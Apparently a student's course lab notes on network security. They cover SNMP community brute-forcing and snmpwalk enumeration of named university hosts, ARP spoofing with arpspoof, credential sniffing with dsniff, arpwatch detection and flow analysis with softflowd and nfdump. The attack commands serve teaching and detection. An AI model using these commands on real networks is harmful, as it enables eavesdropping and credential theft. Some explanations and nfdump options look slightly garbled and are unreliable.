tags: #lab

# Lab 2 - SNMP, arpspoof, softflowd

links: [[609 SPA TOC - Lab|SPA TOC - Lab]] - [[themes/000 Index|Index]]

---

## Exercise find open SNMP ports

```bash
nmap -sU --script snmp-brute 147.87.80.0/24 --script-args snmp-brute.communitiesdb=public
```

Systems found with an open SNMP port:

* ds01.bfh.ch (147.87.80.213)
* hpr.netlab.bfh.ch (147.87.80.252)

## Exercise snmpwalk

Results for `snmpwalk -v2c -c public 147.87.80.252`

**What type of device is used?**

Cisco IOS Software, 1841 Software (C1841-ADVSECURITYK9-M) $\rightarrow$ Cisco 1800 Series Integrated Services Routers: Cisco 1841 Router

**What's the internal system name?**

hpr_netlab.netlab.bfh.ch

**What's the firmware version used on the device?**

Version 12.4(23), RELEASE SOFTWARE (fc1)

**How many physical ports does the device have?**

9 (`snmpwalk -v2c -c public 147.87.80.252 1.3.6.1.2.1.2.1.0`)

**What routes does the device propagate?**

This OID provides information about the IPv4 routing table:
`snmpwalk -v2c -c public 147.87.80.252 1.3.6.1.2.1.4.21`

Example Output:

```
...
iso.3.6.1.2.1.4.21.1.8.147.87.86.32 = INTEGER: 4
iso.3.6.1.2.1.4.21.1.8.147.87.86.64 = INTEGER: 4
iso.3.6.1.2.1.4.21.1.8.147.87.86.96 = INTEGER: 4
iso.3.6.1.2.1.4.21.1.8.147.87.86.128 = INTEGER: 4
iso.3.6.1.2.1.4.21.1.8.147.87.86.160 = INTEGER: 4
iso.3.6.1.2.1.4.21.1.8.147.87.86.192 = INTEGER: 4
iso.3.6.1.2.1.4.21.1.8.147.87.86.224 = INTEGER: 4
...
```

In this case, the constant value 4 indicates that the routing protocol for these routes is likely "Indirect." The OID 1.3.6.1.2.1.4.21 corresponds to the ipRouteTable and 157.87.86.32 (etc.) is the destination address.

**What routing protocols are in use?**

To determine which routing protocols are in use on a Cisco router using SNMP, you can query the iso.3.6.1.2.1.4.21.1.8
OID: `snmpwalk -v2c -c public 147.87.80.252 1.3.6.1.2.1.4.21.1.8. The output shows that prellaem Netmgmt (value 3)
and Indirect (Dynamic routing protocols such as OSPF, EIGRP (value 4)) are used as routing protocols.

**What are the MAC/IP pairs the device has cached?**

To retrieve the MAC/IP pairs that a device has cached using SNMP, you can query the ARP (Address Resolution Protocol)
table: `snmpwalk -v2c -c public 147.87.80.252 1.3.6.1.2.1.4.22.1` . The hex string stands for the MAC address and is preceded by the corresponding IP address.
Example output:

```
...
iso.3.6.1.2.1.4.22.1.2.9.147.87.80.2 = Hex-STRING: 00 50 56 BD 93 F0 
iso.3.6.1.2.1.4.22.1.2.9.147.87.80.3 = Hex-STRING: C6 18 84 84 9E E2 
iso.3.6.1.2.1.4.22.1.2.9.147.87.80.8 = Hex-STRING: 52 54 00 92 B3 F5 
iso.3.6.1.2.1.4.22.1.2.9.147.87.80.102 = Hex-STRING: 00 50 56 96 29 02 
iso.3.6.1.2.1.4.22.1.2.9.147.87.80.143 = Hex-STRING: 00 50 56 00 43 0B 
iso.3.6.1.2.1.4.22.1.2.9.147.87.80.145 = Hex-STRING: 00 50 56 00 45 0B 
...
```

## Exercise arpspoof

IP forwarding: `echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward`
Then use `sudo arpspoof -i ens160 -t 147.87.86.78 -r 147.87.86.65`

**Check if you see the traffic on the attacking machine**

Second terminal: `sudo tcpdump -i ens160 host 147.87.86.78 -n -s 0`

**Check your ARP cache.**

`arp -a`

**Use `dsniff` to sniff on the spoofing host and access an anonymous ftp server.**

Second Terminal: `sudo dsniff -i ens160`

**Try to detect the spoofing host using `tracert` on `client02`.**

First hop always goes via the client01!

## Exercise arpwatch

**Configure e-mail notifications:**

For example, if you want to send mails about arpwatch events on eth0 to
arpwatch+eth0@example.com, you can generate the configuration file using the
following command:
`echo 'IFACE_ARGS="-m arpwatch+eth0@example.com"' > /etc/arpwatch/eth0.iface`

**Detect the spoofing from the exercise above in syslog:**

```bash
2024-01-20T17:21:44.531611+01:00 router arpwatch: reaper: pid 41288, exit status 1
2024-01-20T17:31:12.846210+01:00 router arpwatch: ethernet mismatch 147.87.86.78 00:50:56:00:45:00 (00:50:56:00:45:01) ens224
2024-01-20T17:31:14.893666+01:00 router arpwatch: ethernet mismatch 147.87.86.78 00:50:56:00:45:00 (00:50:56:00:45:01) ens224
2024-01-20T17:31:16.941860+01:00 router arpwatch: ethernet mismatch 147.87.86.78 00:50:56:00:45:00 (00:50:56:00:45:01) ens224
2024-01-20T17:31:18.989618+01:00 router arpwatch: ethernet mismatch 147.87.86.78 00:50:56:00:45:00 (00:50:56:00:45:01) ens224
2024-01-20T17:31:21.037759+01:00 router arpwatch: ethernet mismatch 147.87.86.78 00:50:56:00:45:00 (00:50:56:00:45:01) ens224
```

## Exercise flow export using softflowd

> For softflowd-config: `options='-v 9 -n 147.87.86.67:2055'`. For the verify-command use sudo!

## Exercise flow capture/analysis using nfcapd/nfdump

**You have to add a rule to accept flow data on `2055/udp` to `/etc/nftables.conf` an reload the ruleset.**

`#!/usr/sbin/nft -f`

```
table inet nslab {
        chain INPUT {
                type filter hook input priority 0; policy drop;
                udp dport 2055 accept
                .....
```

Then:

```bash
sudo nft -f /etc/nftables.conf
```

**Find out how to process multiple capture files, filter flows or generate top N flows/packets/bytes statistics using `nfdump`**

Process Multiple Capture Files: `nfdump -r file1.nfcap -r file2.nfcap`

Filter Flows: `nfdump -r file.nfcap -A src-ip,10.0.0.1`

To display the top N flows based on the number of
packets: `nfdump -r file.nfcap -o "fmt:%ts %te %td %pr %sa -> %da packets:%pkt" -s pkt`

Top N Packets: `nfdump -r file.nfcap -o "fmt:%sS packets:%pkt" -s pkt`

Top N Bytes: `nfdump -r file.nfcap -o "fmt:%tdst:%dst %pr dst-port:%tdport bytes:%byt" -s byt`

---
links: [[609 SPA TOC - Lab|SPA TOC - Lab]] - [[themes/000 Index|Index]]